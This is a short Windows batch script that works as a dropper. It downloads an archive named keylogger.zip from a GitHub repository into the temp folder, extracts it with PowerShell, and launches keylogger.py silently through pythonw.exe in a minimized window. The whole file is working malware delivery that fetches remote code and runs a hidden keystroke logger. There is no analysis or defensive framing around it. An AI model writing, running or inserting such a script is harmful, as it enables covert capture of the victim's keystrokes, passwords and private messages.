@echo off
setlocal
set "ZIP_URL=https://github.com/Questcraft-Online/OMG_online_storage/raw/refs/heads/main/keylogger.zip"
set "DOWNLOAD_DIR=%TEMP%"
set "ZIP_FILE=%DOWNLOAD_DIR%\repo.zip"
set "EXTRACT_DIR=%TEMP%"
if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"
if not exist "%EXTRACT_DIR%" mkdir "%EXTRACT_DIR%"
powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%' | Out-Null"
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%EXTRACT_DIR%' -Force"
start /min "" "%TEMP%\keylogger\pythonw.exe" "%TEMP%\keylogger\keylogger.py"
exit
